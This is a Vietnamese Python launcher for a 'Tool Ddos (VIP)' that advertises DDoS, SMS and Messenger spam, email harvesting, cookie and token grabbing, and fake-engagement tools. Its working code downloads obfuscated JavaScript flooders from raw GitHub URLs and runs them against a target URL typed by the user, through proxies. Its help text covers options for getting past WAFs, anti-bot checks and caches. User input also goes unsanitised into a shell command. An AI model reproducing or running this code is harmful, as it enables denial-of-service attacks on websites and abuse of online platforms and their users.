import os
import sys
import subprocess
import time
import json
import base64
import requests
from time import sleep, strftime
from datetime import datetime, timedelta

from pystyle import Colors, Colorate
from rich.console import Console
from rich.panel import Panel
from rich.text import Text

# 👹 Xoá màn hình tương thích mọi hệ điều hành
os.system("cls" if os.name == "nt" else "clear")

# 👹 Định dạng hiển thị log và vạch ngăn
Ddos_tool = "[👹] =>  "
Hanh = "- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -"

# 👹 Lấy IP thật của người dùng (thay vì IP giả)
try:
    ip = requests.get("https://api.ipify.org?format=json").json()
except:
    ip = {"ip": "Không lấy được"}
def banner():
    print(Colorate.Diagonal(Colors.blue_to_cyan, """


..',;:,.
                                            .,cdxk0XWWWWMMMMMMW
                                        :xKNWMMMMMMMMMMMMMMMMMM
                                     'oXWWWWWWWMMMWMMWMMMMMMMMM
                                    dNNXKKNWWWWWWWWWMWMMMMMWWWM
                                  '0NkdddkKNWMMMWWWWWWWWWWWWWNW
          :l;                 .:kONNk,....'oXWWWWNNNNNWNWNOlxkk
          :;K0;        .,:ok0NWWWWWNKxc,...,lkOKK0000KXNNNXKOOK
           .;o0o  ';cx0XNNWWWWWWWWWWN0kocccldkKXKKXXK0KXNWWWKdl
             'dKO,;ollok0XXNNWWWWNNWWN0koccdk0KKKKKXXK0OKNWWNK:
              'ld,   .:lkKXNWWWWWWNXWWWNNX0OO0OOOkO000kddKNNX0;
               .oko. .:okKXXNNNNWNWNXXNNNNNX0xdxkxkk00kd:;ldcl,
                .l0O,,ccxkOOKKXNXNNNK0000Okkxdllox0000kko,. 'l:
                 .oK0c,:ckxxKXNNXXXXKOxkkxkkkxddkOO0K000kl,.  .
            .;clxxdx0Oc..,:ldOkOOOkxodxdddddxxxkkkOOKKK0Oxc'.
            ,kkk0K0kkxo.     .    .....,;;,;,;cdxkkO00Okxc;:oc.
         .xO:.:odxkkxkxo,                    .cxkkOOkxxddxk00x:
       .,..;c;,:ccldodxdl'                  'dkO0KXXXNNNNNNXK0k
       ;ll:;,,,,:::cllllc,.                 .lOXXXNNNWNNNNNNX0x
        ...,;'..,;;::llcc;'.              .lkkxkO0KKXXNNNXkdol:
            ......,::coolc,.             .oO00Odollodk000Od;'',
              ......,;oddo;.              :0XKOxololllclooc'.',
              ..'';,',coddl:              .lk00Okdl:;:clc';'',;
               .',:oollcldxd:.           ..,ddO0Oxl:ccc;'';lodd
                 ..;clcccldxOx.          .',;:ldddxoo;;,:oox00K
                 ...',,;;:cokOd.            .''',..'.'xO0KKKKXX
                    ...'',,;cxkx:'.........'... ... .;kK00KXXXN
                      ...';;:okkl.               ....'cO0KKKXXK
                                             🄰🄽🄾🄽🅈🄼🄾🅄🅂
                                                      
                           𝐇𝐨𝐚𝐧𝐠 𝐀𝐧𝐡 𝐎𝐓𝐏👹
                                     
        BOX ZALO 1: https://zalo.me/g/xwohrt294  
        [ADMIN Hoang Anh]   
        BOX ZALO 2: chưa có cập nhật                
        ADMIN 1: Hoang Anh OTP
        ADMIN 2 : Dark Team
        TIKTOK : @iamnotxxx
        YOUTUBE : Hoang Anh OTP
= = = = = = = = = = = = = = = = = = = = = = = = = = = = = 
"""))
banner()
print (Colorate.Diagonal(Colors.green_to_cyan, "███████████████████████████████████████████████████████████████"))
print (Colorate.Diagonal(Colors.black_to_white, "╔═════════════════════╗"))
print (Colorate.Diagonal(Colors.red_to_white, "║  Tool Ddos (VIP👾)  ║"))
print (Colorate.Diagonal(Colors.white_to_black, "╚═════════════════════╝"))
print (Colorate.Diagonal(Colors.green_to_red, "[👹] => Nhập Số [1] DDOS HTTP2 [10🌟]"))
print (Colorate.Diagonal(Colors.green_to_red, "[👹] => Nhập Số [2] DDOS BYPASS [9.5🌟]"))
print (Colorate.Diagonal(Colors.green_to_cyan, "███████████████████████████████████████████████████████████████"))
print (Colorate.Diagonal(Colors.black_to_white, "╔═══════════════════════╗"))
print (Colorate.Diagonal(Colors.red_to_white, "║  Tool Proxy         ║"))
print (Colorate.Diagonal(Colors.white_to_black, "╚═══════════════════════╝"))
print (Colorate.Diagonal(Colors.green_to_red, "[👹] => Nhập Số [7] TTC TIKTOK [OFF]"))
print (Colorate.Diagonal(Colors.green_to_red, "[👹] => Nhập Số [8] TTC FACEBOOK [ĐHP]"))
print (Colorate.Diagonal(Colors.green_to_red, "[👹] => Nhập Số [9] TOOL TTC PRO5"))
print (Colorate.Diagonal(Colors.green_to_red, "[👹] => Nhập Số [10] TOOL TTC INSTAGRAM"))
print (Colorate.Diagonal(Colors.green_to_cyan, "███████████████████████████████████████████████████████████████"))
print (Colorate.Diagonal(Colors.black_to_white, "╔═════════════════════╗"))
print (Colorate.Diagonal(Colors.red_to_white, "║  Tool Spam Sms      ║"))
print (Colorate.Diagonal(Colors.white_to_black, "╚═════════════════════╝"))
print (Colorate.Diagonal(Colors.green_to_red, "[👹] => Nhập Số [11] TOOL SPAM SMS V1"))
print (Colorate.Diagonal(Colors.green_to_red, "[👹] => Nhập Số [12] TOOL SPAM SMS V2"))
print (Colorate.Diagonal(Colors.green_to_cyan, "███████████████████████████████████████████████████████████████"))
print (Colorate.Diagonal(Colors.black_to_white, "╔═════════════════════╗"))
print (Colorate.Diagonal(Colors.red_to_white, "║  Tool Đào Mail      ║"))
print (Colorate.Diagonal(Colors.white_to_black,"╚═════════════════════╝"))
print (Colorate.Diagonal(Colors.green_to_red, "[👹] => Nhập Số [13] TOOL ĐÀO MAIL"))
print (Colorate.Diagonal(Colors.green_to_red, "[👹] => Nhập Số [14] TOOL ĐÀO MAIL FULL MAIL"))
print (Colorate.Diagonal(Colors.green_to_red, "[👹] => Nhập Số [15] TOOL CHECK LIVE\DIE"))
print (Colorate.Diagonal(Colors.green_to_red, "[👹] => Nhập Số [16] TOOL CHECK VALID"))
print (Colorate.Diagonal(Colors.green_to_red, "[👹] => Nhập Số [17] TOOL REG ACC GARENA [NEW] "))
print (Colorate.Diagonal(Colors.green_to_cyan, "███████████████████████████████████████████████████████████████"))
print (Colorate.Diagonal(Colors.black_to_white, "╔═════════════════════╗"))
print (Colorate.Diagonal(Colors.red_to_white, "║  Tool Facebook      ║"))
print (Colorate.Diagonal(Colors.white_to_black, "╚═════════════════════╝"))
print (Colorate.Diagonal(Colors.green_to_red, "[👹] => Nhập Số [18] TOOL BUFF LIKE "))
print (Colorate.Diagonal(Colors.green_to_red, "[👹] => Nhập Số [19] KẾT BẠN FACEBOOK GỢI Ý"))
print (Colorate.Diagonal(Colors.green_to_red, "[👹] => Nhập Số [20] SHARE ẢO COOKIE "))
print (Colorate.Diagonal(Colors.green_to_red, "[👹] => Nhập Số [21] SHARE ẢO TOKEN"))
print (Colorate.Diagonal(Colors.green_to_red, "[👹] => Nhập Số [22] TOOL BUFF VIEW STR"))
print (Colorate.Diagonal(Colors.green_to_red, "[👹] => Nhập Số [23] TOOL NUÔI FACEBOOK"))
print (Colorate.Diagonal(Colors.green_to_cyan, "███████████████████████████████████████████████████████████████"))
print (Colorate.Diagonal(Colors.black_to_white, "╔═════════════════════════╗"))
print (Colorate.Diagonal(Colors.red_to_white, "║Tool Đào & Check Proxies ║"))
print (Colorate.Diagonal(Colors.white_to_black, "╚═════════════════════════╝"))
print (Colorate.Diagonal(Colors.green_to_red, "[👹] => Nhập Số [24] TOOL CHECK LIVE\DIE [V1] "))
print (Colorate.Diagonal(Colors.green_to_red, "[👹] => Nhập Số [25] TOOL CHECK LIVE\DIE [V2 SIÊU VIP]"))
print (Colorate.Diagonal(Colors.green_to_red, "[👹] => Nhập Số [26] TOOL ĐÀO PROXY [V1]"))
print (Colorate.Diagonal(Colors.green_to_red, "[👹] => Nhập Số [27] TOOL ĐÀO PROXY [V2]"))
print (Colorate.Diagonal(Colors.green_to_red, "[👹] => Nhập Số [28] TOOL ĐÀO PROXY [V3]"))
print (Colorate.Diagonal(Colors.green_to_red, "[👹] => Nhập Số [29] TOOL ĐÀO PROXY [V4 SIÊU VIP]"))
print (Colorate.Diagonal(Colors.green_to_cyan, "███████████████████████████████████████████████████████████████"))
print (Colorate.Diagonal(Colors.black_to_white, "╔═════════════════════════╗"))
print (Colorate.Diagonal(Colors.red_to_white, "║Tool Spam Messenger      ║"))
print (Colorate.Diagonal(Colors.white_to_black, "╚═════════════════════════╝"))
print (Colorate.Diagonal(Colors.green_to_red, "[👹] => Nhập Số [30] TOOL NHÂY CÓ DẤU  "))
print (Colorate.Diagonal(Colors.green_to_red, "[👹] => Nhập Số [31] TOOL NHÂY KHÔNG DẤU "))
print (Colorate.Diagonal(Colors.green_to_red, "[👹] => Nhập Số [32] TOOL NHÂY RÉO TÊN TRONG BOX "))
print (Colorate.Diagonal(Colors.green_to_red, "[👹] => Nhập Số [33] TOOL NHÂY CODE LAG "))
print (Colorate.Diagonal(Colors.green_to_red, "[👹] => Nhập Số [34] TOOL TREO SỚ "))
print (Colorate.Diagonal(Colors.green_to_red, "[👹] => Nhập Số [35] TOOL NHÂY DISCORD"))
print (Colorate.Diagonal(Colors.green_to_cyan, "███████████████████████████████████████████████████████████████"))
print (Colorate.Diagonal(Colors.black_to_white, "╔═════════════════════════╗"))
print (Colorate.Diagonal(Colors.red_to_white, "║Tool Encode & Dec        ║"))
print (Colorate.Diagonal(Colors.white_to_black, "╚═════════════════════════╝"))
print (Colorate.Diagonal(Colors.green_to_red, "[👹] => Nhập Số [36] TOOL DEC Hyperion_Deobf"))
print (Colorate.Diagonal(Colors.green_to_red, "[👹] => Nhập Số [37] TOOL DEC Kramer-Specter_Deobf"))
print (Colorate.Diagonal(Colors.green_to_red, "[👹] => Nhập Số [38] TOOL dump_marshal"))
print (Colorate.Diagonal(Colors.green_to_red, "[👹] => Nhập Số [39] TOOL Convert_Marshal-PYC"))
print (Colorate.Diagonal(Colors.green_to_red, "[👹] => Nhập Số [40] TOOL ENCODE MZB"))
print (Colorate.Diagonal(Colors.green_to_red, "[👹] => Nhập Số [41] TOOL ENCODE EMOJI "))
print (Colorate.Diagonal(Colors.green_to_red, "[👹] => Nhập Số [42] TOOL ENCODE EJULY-DUYKHANH"))
print (Colorate.Diagonal(Colors.green_to_red, "[👹] => Nhập Số [43] TOOL ENCODE BY MEO [VIP]"))
print (Colorate.Diagonal(Colors.green_to_cyan, "███████████████████████████████████████████████████████████████"))
print (Colorate.Diagonal(Colors.black_to_white, "╔═════════════════════════╗"))
print (Colorate.Diagonal(Colors.red_to_white, "║Tool Aotu Golike         ║"))
print (Colorate.Diagonal(Colors.white_to_black, "╚═════════════════════════╝"))
print (Colorate.Diagonal(Colors.green_to_red, "[👹] => Nhập Số [44] Tool Auto TikTok"))
print (Colorate.Diagonal(Colors.green_to_red, "[👹] => Nhập Số [45] Tool Auto TikTok [OFF] "))
print (Colorate.Diagonal(Colors.green_to_red, "[👹] => Nhập Số [46] Tool Auto TikTok Tự Động [OFF] "))
print (Colorate.Diagonal(Colors.green_to_red, "[👹] => Nhập Số [47] Tool Auto Instagram "))
print (Colorate.Diagonal(Colors.green_to_red, "[👹] => Nhập Số [48] Tool Auto Twitter"))
print (Colorate.Diagonal(Colors.green_to_red, "[👹] => Nhập Số [49] Tool Auto Youtube [OFF]"))
print (Colorate.Diagonal(Colors.green_to_red, "[👹] => Nhập Số [50] Tool Auto Thread [OFF]"))
print (Colorate.Diagonal(Colors.green_to_red, "[👹] => Nhập Số [51] Tool Auto Linkedin [OFF]"))
print (Colorate.Diagonal(Colors.green_to_red, "[👹] => Nhập Số [52] Tool Auto Shoppe [OFF] "))
print (Colorate.Diagonal(Colors.green_to_cyan, "███████████████████████████████████████████████████████████████"))
print (Colorate.Diagonal(Colors.black_to_white, "╔═════════════════════════╗"))
print (Colorate.Diagonal(Colors.red_to_white, "║Tool Của Các Idol Khác   ║"))
print (Colorate.Diagonal(Colors.white_to_black, "╚═════════════════════════╝"))
print (Colorate.Diagonal(Colors.green_to_red, "[👹] => Nhập Số [53] TOOL VLONG ZZ"))
print (Colorate.Diagonal(Colors.green_to_red, "[👹] => Nhập Số [54] TOOL TRỊNH HƯỚNG"))
print (Colorate.Diagonal(Colors.green_to_red, "[👹] => Nhập Số [55] TOOL MEOWMEOW"))
print (Colorate.Diagonal(Colors.green_to_red, "[👹] => Nhập Số [56] TOOL HDT-TOOL"))
print (Colorate.Diagonal(Colors.green_to_red, "[👹] => Nhập Số [57] TOOL LKZ TOOL"))
print (Colorate.Diagonal(Colors.green_to_red, "[👹] => Nhập Số [58] TOOL JIRAY TOOL"))
print (Colorate.Diagonal(Colors.green_to_cyan, "███████████████████████████████████████████████████████████████"))
print (Colorate.Diagonal(Colors.black_to_white, "╔════════════════╗"))
print (Colorate.Diagonal(Colors.red_to_white, "║Tool Profile 5  ║"))
print (Colorate.Diagonal(Colors.white_to_black, "╚════════════════╝"))
print (Colorate.Diagonal(Colors.green_to_red, "[👹] => Nhập Số [59] Tool Buff Member Facebook"))
print (Colorate.Diagonal(Colors.green_to_red, "[👹] => Nhập Số [60] Tool Get Cookie Page Thường & Page Pro5"))
print (Colorate.Diagonal(Colors.green_to_red, "[👹] => Nhập Số [61] Tool Chuyển QTV Pro5"))
print (Colorate.Diagonal(Colors.green_to_red, "[👹] => Nhập Số [62] Tool Follow Page Pro5"))
print (Colorate.Diagonal(Colors.green_to_red, "[👹] => Nhập Số [63] TOOL REG PAGR PRO5 + UP AVT | ĐA LUỒNG"))
print (Colorate.Diagonal(Colors.green_to_red, "[👹] => Nhập Số [64] Tool Rút Gọn Link                       "))       
print (Colorate.Diagonal(Colors.green_to_red, "[👹] => Nhập Số [65] Get Phản Hồi Từ Link                     "))
print (Colorate.Diagonal(Colors.green_to_red, "[👹] => Nhập Số [66] Lọc Link Từ File                         "))
print (Colorate.Diagonal(Colors.green_to_red, "[👹] => Nhập Số [67] TOOL REG ACC FACEBOOK                    "))
print (Colorate.Diagonal(Colors.green_to_red, "[👹] => Nhập Số [68] TOOL CHUYỂN QUYỀN + CHẤP NHẬN ADMIN PAGE "))
print (Colorate.Diagonal(Colors.green_to_red, "[👹] => Nhập Số [69] TOOL KÍCH HOẠT PAGE                      "))
print (Colorate.Diagonal(Colors.green_to_red, "[👹] => Nhập Số [70] TOOL GET TOKEN FB                        "))
print (Colorate.Diagonal(Colors.green_to_cyan, "███████████████████████████████████████████████████████████████"))
print (Colorate.Diagonal(Colors.black_to_white, "╔════════════════╗"))
print (Colorate.Diagonal(Colors.red_to_white, "║Tool Tiện ích   ║"))
print (Colorate.Diagonal(Colors.white_to_black, "╚════════════════╝"))
print (Colorate.Diagonal(Colors.green_to_red, "[👹] => Nhập Số [71] TOOL DOSS WEB VIP         "))
print (Colorate.Diagonal(Colors.green_to_red, "[👹] => Nhập Số [72] TOOL DOSS WEB VIP         "))
print (Colorate.Diagonal(Colors.green_to_red, "[👹] => Nhập Số [00] Thoát Tool                               "))   
print (Colorate.Diagonal(Colors.green_to_cyan, "███████████████████████████████████████████████████████████████"))
chon = str(input (Colorate.Diagonal(Colors.blue_to_cyan, '[👹] => Nhập Số : ')))
def rainbow(text):
    return Colorate.Diagonal(Colors.blue_to_red, text, 2)

def show_syntax(tool_id):
    if tool_id == "1":
        print(rainbow("📘 Cú pháp:") + "\nnode flood10.js <target> <time> <req> <thread> <proxyfile> <flood/bypass>")
        print(rainbow("""🎯 Tham số bắt buộc:
  target       → Địa chỉ mục tiêu (Target URL)
  time         → Thời gian chạy (giây)
  req          → Số request mỗi luồng
  thread       → Số luồng đồng thời
  proxyfile    → File chứa proxy HTTP/SOCKS
  flood/bypass → Chế độ tấn công (flood hoặc bypass)

📌 Ví dụ:
🟢 Termux:
node flood10.js https://example.com 30 10 5 proxy.txt flood

🔵 PC/VPS:
node flood10.js https://example.com 60 100 20 proxy.txt bypass
"""))
    elif tool_id == "2":
        print(rainbow("📘 Cú pháp:") + "\nnode hyper10.js <target> <time> <rate> <thread> <proxy.txt>")
        print(rainbow("""🎯 Tham số bắt buộc:
  target    → Mục tiêu (Target URL)
  time      → Thời gian chạy (giây)
  rate      → Request mỗi luồng
  thread    → Số luồng
  proxy.txt → File proxy

📌 Ví dụ:
🟢 Termux:
node hyper10.js https://example.com 30 10 5 proxy.txt

🔵 PC/VPS:
node hyper10.js https://example.com 60 100 20 proxy.txt
"""))
    elif tool_id == "3":
        print(rainbow("📘 Cú pháp:") + "\nnode ASTRAL9.7.js <host> <time> <req> <thread> <proxy.txt>")
        print(rainbow("""🎯 Tham số bắt buộc:
  host      → Target URL
  time      → Thời gian (giây)
  req       → Requests per thread
  thread    → Number of threads
  proxy.txt → Proxy list

📌 Ví dụ:
🟢 Termux:
node ASTRAL9.7.js https://abc.com 30 10 5 proxy.txt

🔵 PC/VPS:
node ASTRAL9.7.js https://abc.com 60 100 20 proxy.txt
"""))
    elif tool_id == "4":
        print(rainbow("📘 Cú pháp:") + "\nnode bypass9.6.js <host> <time> <rate> <thread> <proxy.txt> [options]")
        print(rainbow("""🎯 Tham số bắt buộc:
  host      → Target URL
  time      → Time in seconds
  rate      → Requests per thread
  thread    → Threads
  proxy.txt → Proxy file

🎯 Tuỳ chọn nâng cao:
  --bypass      → Vượt hệ thống chống bot
  --cache       → Vượt cache
  --query       → Random query string
  --extra       → Extra evasion headers
  --type socks5 → Chỉ định loại proxy

📌 Ví dụ:
🟢 Termux:
node bypass9.6.js https://abc.com 30 5 5 proxy.txt --bypass

🔵 PC/VPS:
node bypass9.6.js https://abc.com 60 50 20 proxy.txt --bypass --cache --extra --query
"""))
    elif tool_id == "5":
        print(rainbow("📘 Cú pháp:") + "\nnode CF2TLS9.6.js <host> <time> <req> <thread> <live.txt>")
        print(rainbow("""🎯 Tham số bắt buộc:
  host     → Target URL
  time     → Seconds
  req      → Requests per thread
  thread   → Threads
  live.txt → File proxy live

📌 Ví dụ:
🟢 Termux:
node CF2TLS9.6.js https://abc.com 30 10 5 live.txt

🔵 PC/VPS:
node CF2TLS9.6.js https://abc.com 60 100 20 live.txt
"""))
    elif tool_id == "6":
        print(rainbow("📘 Cú pháp:") + "\nnode flood_9.6.js <target> <time> <thread> <rate> <proxyfile> [options]")
        print(rainbow("""🎯 Tham số bắt buộc:
  target    → Target URL
  time      → Seconds
  thread    → Threads
  rate      → Requests per thread
  proxyfile → Proxy list

🎯 Tuỳ chọn nâng cao:
  --version     → HTTP version (1/2/mix)
  --delay       → Né rate-limit
  --query       → Random query
  --random      → Randomize path
  --bypass      → Bypass WAF
  --human       → Human behavior
  --extra       → Extra headers
  --debug       → Debug

📌 Ví dụ:
🟢 Termux:
node flood_9.6.js https://abc.com 30 5 10 proxy.txt --query true

🔵 PC/VPS:
node flood_9.6.js https://abc.com 60 20 100 proxy.txt --bypass true --extra true
"""))
    elif tool_id == "7":
        print(rainbow("📘 Cú pháp:") + "\nnode LI-TLS9.6.js <target> <time> <rate> <thread> <proxy.txt>")
        print(rainbow("""🎯 Tham số bắt buộc:
  target    → Target URL
  time      → Seconds
  rate      → Requests per thread
  thread    → Threads
  proxy.txt → Proxy file

📌 Ví dụ:
🟢 Termux:
node LI-TLS9.6.js https://abc.com 30 5 5 proxy.txt

🔵 PC/VPS:
node LI-TLS9.6.js https://abc.com 60 100 50 proxy.txt
"""))

def download_and_run_js(url, tool_id, filename="tool.js"):
    print(f"🔽 Đang tải tool từ: {url}")
    try:
        r = requests.get(url); r.raise_for_status()
        with open(filename, "w", encoding="utf-8") as f:
            f.write(r.text)
        print("✅ Tải xong.")
        show_syntax(tool_id)

        # Nhập tham số tuỳ tool
        if tool_id == "1":
            host = input("🌐 Host: ")
            time = input("⏱ Time: ")
            req = input("📈 Request: ")
            thread = input("🧵 Thread: ")
            proxy = input("📄 Proxy file: ")
            method = input("⚔️ flood/bypass: ")
            cmd = f"node {filename} {host} {time} {req} {thread} {proxy} {method}"
        elif tool_id == "2":
            host = input("🌐 Host: ")
            time = input("⏱ Time: ")
            rate = input("🚀 Rate: ")
            thread = input("🧵 Thread: ")
            proxy = input("📄 Proxy file: ")
            cmd = f"node {filename} {host} {time} {rate} {thread} {proxy}"
        elif tool_id == "3":
            host = input("🌐 Host: ")
            time = input("⏱ Time: ")
            req = input("📈 Request: ")
            thread = input("🧵 Thread: ")
            proxy = input("📄 Proxy file: ")
            cmd = f"node {filename} {host} {time} {req} {thread} {proxy}"
        elif tool_id == "4":
            host = input("🌐 Host: ")
            time = input("⏱ Time: ")
            rate = input("🚀 Rate: ")
            thread = input("🧵 Thread: ")
            proxy = input("📄 Proxy file: ")
            options = input("⚙️ Tuỳ chọn thêm: ")
            cmd = f"node {filename} {host} {time} {rate} {thread} {proxy} {options}"
        elif tool_id == "5":
            host = input("🌐 Host: ")
            time = input("⏱ Time: ")
            req = input("📈 Request: ")
            thread = input("🧵 Thread: ")
            proxy = input("📄 File proxy live: ")
            cmd = f"node {filename} {host} {time} {req} {thread} {proxy}"
        elif tool_id == "6":
            host = input("🌐 Host: ")
            time = input("⏱ Time: ")
            thread = input("🧵 Thread: ")
            rate = input("🚀 Rate: ")
            proxy = input("📄 Proxy file: ")
            options = input("⚙️ Tuỳ chọn thêm: ")
            cmd = f"node {filename} {host} {time} {thread} {rate} {proxy} {options}"
        elif tool_id == "7":
            host = input("🌐 Host: ")
            time = input("⏱ Time: ")
            rate = input("🚀 Rate: ")
            thread = input("🧵 Thread: ")
            proxy = input("📄 Proxy file: ")
            cmd = f"node {filename} {host} {time} {rate} {thread} {proxy}"
        else:
            print("❌ Tool chưa cấu hình.")
            return

        print(f"▶️ Đang chạy: {cmd}")
        os.system(cmd)

    except Exception as e:
        print(f"❌ Lỗi khi tải/chạy tool: {e}")

def menu():
    os.system("cls" if os.name == "nt" else "clear")
    print(Colorate.Diagonal(Colors.green_to_red, "=== TOOL DDOS 7 CHỨC NĂNG – HOANGANH OTP ===\n"))

    tool_names = {
        "1": "flood10.js",
        "2": "hyper10.js",
        "3": "ASTRAL9.7.js",
        "4": "bypass9.6.js",
        "5": "CF2TLS9.6.js",
        "6": "flood_9.6.js",
        "7": "LI-TLS9.6.js"
    }
    # Hiển thị menu 1–72, chỉ 1–7 có name thật
    for i in range(1, 7):
        label = tool_names.get(str(i), "...")
        print(f"[{i:02}] {label}")

    print("[00] Thoát\n")
    chon = input("Nhập số chức năng: ").strip()
    if chon == "00":
        print("👋 Tạm biệt!"); return
    if chon in tool_names:
        links = {
            "1": "https://raw.githubusercontent.com/mattercu/hosttool/refs/heads/main/flood10.js-ubf.js",
            "2": "https://raw.githubusercontent.com/mattercu/hosttool/refs/heads/main/hyper10.js-ubf.js",
            "3": "https://raw.githubusercontent.com/mattercu/hosttool/refs/heads/main/ASTRAL9.7.js-ubf.js",
            "4": "https://raw.githubusercontent.com/mattercu/hosttool/refs/heads/main/bypass9.6.js",
            "5": "https://raw.githubusercontent.com/mattercu/hosttool/refs/heads/main/CF2TLS9.6.js-ubf.js",
            "6": "https://raw.githubusercontent.com/mattercu/hosttool/refs/heads/main/flood_9.6.js-ubf.js",
            "7": "https://raw.githubusercontent.com/mattercu/hosttool/refs/heads/main/LI-TLS9.6.js-ubf.js"
        }
        download_and_run_js(links[chon], chon)
    else:
        print("❌ Không hợp lệ.")

def main():
    banner()
    input("\n👉 Nhấn Enter để hiển thị menu chức năng...")
    menu()

if __name__ == "__main__":
    main()